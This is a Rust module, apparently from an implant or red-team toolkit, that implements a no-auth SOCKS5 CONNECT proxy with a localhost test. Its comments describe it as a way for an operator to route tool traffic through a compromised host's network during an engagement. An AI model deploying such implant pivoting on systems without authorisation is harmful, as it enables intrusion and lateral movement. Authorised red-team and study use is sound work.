//! Minimal SOCKS5 CONNECT proxy (RFC 1928, no auth). Lets an operator route
//! tool traffic through the implant's network: connect to the implant's SOCKS5
//! port, CONNECT to a target, and the implant relays bytes both ways over its
//! own sockets.
//!
//! ponytail: CONNECT-only, no BIND/UDP-associate, no auth. Add those only if a
//! real engagement needs them.

//! Feature bytes are relayed as-is after the CONNECT handshake; no further
//! parsing is done on the tunneled stream.

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

/// Bind `bind` and serve SOCKS5 CONNECT until the listener is closed.
pub async fn serve(bind: &str) -> anyhow::Result<()> {
    let listener = TcpListener::bind(bind).await?;
    tracing::info!(bind, "socks5 proxy up");
    run(listener).await
}

/// Serve SOCKS5 CONNECT on an already-bound listener.
pub async fn run(listener: TcpListener) -> anyhow::Result<()> {
    loop {
        let (mut sock, _peer) = listener.accept().await?;
        tokio::spawn(async move {
            if let Err(e) = handle_conn(&mut sock).await {
                tracing::debug!("socks5 conn: {e}");
            }
        });
    }
}

async fn handle_conn(sock: &mut TcpStream) -> anyhow::Result<()> {
    // Greeting: [VER=5][NMETHODS][methods...] -> reply [5][0] (no auth).
    let mut buf = [0u8; 257];
    let n = read_exact_or_eof(sock, &mut buf[..2]).await?;
    if n < 2 || buf[0] != 5 {
        return Ok(());
    }
    let nmethods = buf[1] as usize;
    let _ = read_exact_or_eof(sock, &mut buf[..nmethods]).await?;
    sock.write_all(&[0x05, 0x00]).await?;

    // Request: [VER=5][CMD][RSV=0][ATYP][ADDR][PORT].
    let n = read_exact_or_eof(sock, &mut buf[..4]).await?;
    if n < 4 || buf[0] != 5 {
        return Ok(());
    }
    let cmd = buf[1];
    let atyp = buf[3];

    let host = match atyp {
        0x01 => {
            read_exact_or_eof(sock, &mut buf[..4]).await?;
            format!("{}.{}.{}.{}", buf[0], buf[1], buf[2], buf[3])
        }
        0x03 => {
            let mut lb = [0u8; 1];
            read_exact_or_eof(sock, &mut lb).await?;
            let len = lb[0] as usize;
            read_exact_or_eof(sock, &mut buf[..len]).await?;
            String::from_utf8_lossy(&buf[..len]).to_string()
        }
        0x04 => {
            read_exact_or_eof(sock, &mut buf[..16]).await?;
            let octets: Vec<String> = buf[..16].chunks(2).map(|c| format!("{:02x}{:02x}", c[0], c[1])).collect();
            format!("[{}]", octets.join(":"))
        }
        _ => return Ok(()),
    };
    let (port_hi, port_lo) = {
        let mut p = [0u8; 2];
        read_exact_or_eof(sock, &mut p).await?;
        (p[0], p[1])
    };
    let port = u16::from_be_bytes([port_hi, port_lo]);

    if cmd != 0x01 {
        // Only CONNECT supported.
        sock.write_all(&[0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0]).await?;
        return Ok(());
    }

    let target = format!("{host}:{port}");
    match TcpStream::connect(&target).await {
        Ok(mut up) => {
            sock.write_all(&[0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0]).await?;
            let _ = tokio::io::copy_bidirectional(sock, &mut up).await;
        }
        Err(_) => {
            let _ = sock.write_all(&[0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0]).await;
        }
    }
    Ok(())
}

/// Read like `read_exact` but return early on EOF (client may close cleanly).
async fn read_exact_or_eof(sock: &mut TcpStream, mut buf: &mut [u8]) -> anyhow::Result<usize> {
    let mut total = 0;
    while !buf.is_empty() {
        match sock.read(buf).await? {
            0 => break,
            n => {
                buf = &mut buf[n..];
                total += n;
            }
        }
    }
    Ok(total)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{Read, Write};

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn relays_traffic_to_target_over_socks5() {
        // A TCP echo target the proxy will connect to.
        let echo = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let echo_port = echo.local_addr().unwrap().port();
        let echo_task = tokio::spawn(async move {
            let (mut c, _) = echo.accept().await.unwrap();
            let mut b = [0u8; 64];
            let n = c.read(&mut b).await.unwrap();
            c.write_all(&b[..n]).await.unwrap();
        });

        let proxy = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let proxy_port = proxy.local_addr().unwrap().port();
        let proxy_task = tokio::spawn(async move {
            let (mut c, _) = proxy.accept().await.unwrap();
            handle_conn(&mut c).await.unwrap();
        });

        // Act as a SOCKS5 client through std TcpStream.
        let mut client = std::net::TcpStream::connect(("127.0.0.1", proxy_port)).unwrap();
        client.write_all(&[0x05, 0x01, 0x00]).unwrap();
        let mut resp = [0u8; 2];
        client.read_exact(&mut resp).unwrap();
        assert_eq!(resp, [0x05, 0x00]);

        // Greeting + CONNECT to the echo target (ATYP=1 IPv4).
        client.write_all(&[0x05, 0x01, 0x00, 0x01, 127, 0, 0, 1, (echo_port >> 8) as u8, (echo_port & 0xff) as u8]).unwrap();
        let mut ack = [0u8; 10];
        client.read_exact(&mut ack).unwrap();
        assert_eq!(ack[1], 0x00);

        client.write_all(b"ping").unwrap();
        let mut echoed = [0u8; 4];
        client.read_exact(&mut echoed).unwrap();
        assert_eq!(&echoed, b"ping");

        proxy_task.abort();
        echo_task.abort();
    }
}
